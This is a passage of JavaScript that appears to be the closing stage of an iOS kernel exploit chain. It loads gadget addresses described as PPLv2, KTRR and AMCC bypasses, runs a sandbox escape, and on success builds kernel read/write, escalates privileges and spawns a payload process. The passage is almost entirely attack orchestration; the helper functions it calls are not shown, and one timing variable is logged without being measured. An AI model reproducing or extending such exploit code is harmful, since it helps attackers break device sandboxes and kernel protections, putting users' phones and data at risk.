    mpd_write64(new_func_offsets_buffer + idx * 0x8n, pplv2_bypass_gadget);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, ktrr_unlock_gadget);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, amcc_config_gadget);
    idx += 0x1n;
    LOG(`iOS 26 specific gadgets: pplv2=${pplv2_bypass_gadget.hex()}, ktrr=${ktrr_unlock_gadget.hex()}, amcc=${amcc_config_gadget.hex()}`);
    mpd_evaluateScript_nowait_exit(ctx, pe_main_cfstring);
    LOG("[MPD iOS26] pe spawned with PPLv2/KTRR/AMCC bypass support");
  }

  let exp_bypass_interval = 0;
  let sbx1sbx1_interval = 0;
  sbx1sbx1_interval = Date.now();
  let sbx1sbx1_succeeded = sbx1sbx1();
  sbx1sbx1_interval = Date.now() - sbx1sbx1_interval;
  LOG(`[profiler] Sbx1 EXP bypass took ${exp_bypass_interval} ms`);
  if (sbx1sbx1_succeeded) {
    LOG(`[profiler] Sbx1 took ${sbx1sbx1_interval} ms`);
  } else {
    LOG(`[profiler] Sbx1 failed in ${sbx1sbx1_interval} ms`);
  }
  if (sbx1sbx1_succeeded) {
    buildKernelRW();
    find_kernel_base();
    fill_real_gadgets();
    setup_pplv2_bypass();
    setup_ktrr_bypass();
    setup_amcc_bypass();
    escalate_privileges();
    spawn_pe();
  }
  globalThis.sbx1_done = true;
  globalThis.sbx1_26_end = Date.now();
  LOG('sbx1_main_26 completed');
  return sbx1sbx1_succeeded;
}
